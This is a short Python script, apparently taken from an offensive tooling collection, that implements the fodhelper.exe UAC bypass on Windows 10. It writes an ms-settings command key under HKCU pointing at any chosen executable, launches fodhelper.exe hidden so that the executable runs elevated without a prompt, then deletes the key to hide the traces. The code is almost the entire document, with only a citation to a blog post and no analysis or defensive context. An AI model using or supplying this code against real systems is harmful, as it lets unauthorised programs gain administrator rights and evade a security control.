"""
https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
	
Fodhelper.exe was introduced in Windows 10 to manage optional features like
region-specific keyboard settings. Its location is: C:\Windows\System32\fodhelper.exe
and it is signed by Microsoft.
"""
import _winreg
import win32api
import win32con

def fodhelper_dll_hijack(executable_path):
	registry_path = r"Software\Classes\ms-settings\Shell\Open\command"
	
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,registry_path)
		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,executable_path)
	except Exception as e:
		return False
	try:
		win32api.ShellExecute(0,None,"c:\windows\system32\fodhelper.exe", None, None, win32con.SW_HIDE)
	except Exception as error:
		return False	
	
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\ms-settings")
	except Exception as error:
		return False
